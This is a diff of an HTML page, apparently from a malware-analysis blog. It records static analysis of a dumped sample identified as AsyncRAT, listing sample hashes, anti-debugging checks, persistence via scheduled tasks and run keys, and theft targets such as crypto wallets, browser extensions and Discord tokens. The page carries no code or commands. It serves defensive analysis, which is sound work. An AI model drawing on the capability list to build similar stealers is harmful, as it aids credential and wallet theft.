-	https://www.virustotal.com/gui/file/9e3b980a2d5989265088ac01bc076fe5e06cf845d05d1d0e7ea053af5f7481c7/details
-
-	<p>Dropped the file on PE-bear.</p>
-
-	<img src="/assets/imgs/1/44.png" width="70%" />
-
-
-	<br />
-	<br />
-	<br />
-	<p>Funny compilation date</p>
-	<img src="/assets/imgs/1/45.png" width="70%" />
-
-
-	<br />
-	<br />
-	<br />
-	Notable strings:
-	<ul>
-	<li><code>microstub</code> and</li>
-	<li><code>NewPE.dll</code></li>
-	</ul>
-	<img src="/assets/imgs/1/46.png" width="70%" />
-
-
-
-
-	<br />
-	<br />
-	<br />
-	<br />
-	<h1># Taking a quick look at <code>dumped.bin</code></h1>
-
-
-	<br />
-	I searched for the hash online and found these two links:
-	<ul>
-	<li>60 / 73 hits on VirusTotal - https://www.virustotal.com/gui/file/9c4382baca1a31a12c7e60bf324113f763e3d4e813ee518638a6f6f85aac3c70</li>
-	<li>AsyncRAT from 9 months ago - https://bazaar.abuse.ch/sample/9c4382baca1a31a12c7e60bf324113f763e3d4e813ee518638a6f6f85aac3c70/</li>
-	</ul>
-
-
-	<br />
-	<p>Dropped it on PE-bear. It's a valid PE.</p>
-
-	<img src="/assets/imgs/1/47.png" width="60%" />
-
-
-	<br />
-	<br />
-	<p>Possible compilation date.</p>
-	<img src="/assets/imgs/1/48.png" width="40%" />
-
-
-	<br />
-	<br />
-	<p>Imports.</p>
-
-	<img src="/assets/imgs/1/49.png" width="50%" />
-
-
-	<br />
-	<br />
-	<p>Strings might reveal more information.</p>
-
-	<p>Possible persistence via scheduled task and run key.</p>
-
-	<img src="/assets/imgs/1/50.png" width="60%" />
-
-
-	<br />
-	<br />
-	<p>Anti Debugging checks</p>
-	<p><code>SbieDll.dll</code> is a known DLL used by Sandboxie.</p>
-	<img src="/assets/imgs/1/51.png" width="60%" />
-
-
-	<br />
-	<br />
-	<p>Crypto wallet checks in browser data.</p>
-	<p>Also seems to be looking for specific browser extensions.</p>
-
-	<img src="/assets/imgs/1/52.png" width="70%" />
-
-
-	<img src="/assets/imgs/1/53.png" width="15%" />
-
-
-
-
-	<br />
-	<br />
-	<p>Discord tokens / Anydesk?</p>
-	<p>Also, can potentially kill processes using taskkill.</p>
-
-	<img src="/assets/imgs/1/54.png" width="8%" />
-
-
-	<img src="/assets/imgs/1/55.png" width="12%" />
-
-
-	<br />
-	<br />
-	<p><code>Stub.exe</code>; note that the internal name of the dumped "Avast" dll was <code>microstub</code>.</p>
-
-	<img src="/assets/imgs/1/56.png" width="70%" />
-
-
-
-	<br />
-	<br />
-	<p>For example checking one of these</p>
-	<img src="/assets/imgs/1/57.png" width="100%" />
-
-	<br />
-	<br />
-	<img src="/assets/imgs/1/58.png" width="40%" />
-
-	<br />
-	<br />
-	<img src="/assets/imgs/1/59.png" width="70%" />
-
-	<br />
-	<br />
-	<br />
-	<img src="/assets/imgs/1/60.png" width="45%" />
-
-	<br />
-	<br />
-	<br />
-	<img src="/assets/imgs/1/61.png" width="70%" />
-
+				<p>For example, checking one of these</p>
+				<img src="/assets/imgs/1/57.png" width="100%" class="displayFull" />
+				<img src="/assets/imgs/1/58.png" width="40%" class="displayFull" />
+				<img src="/assets/imgs/1/59.png" width="70%" class="displayFull" />
+				<img src="/assets/imgs/1/60.png" width="45%" class="displayFull" />
+				<img src="/assets/imgs/1/61.png" width="70%" class="displayFull" />
+			</article>
+		</div>
+	</main>
+	</div>
 </body>
 </html>
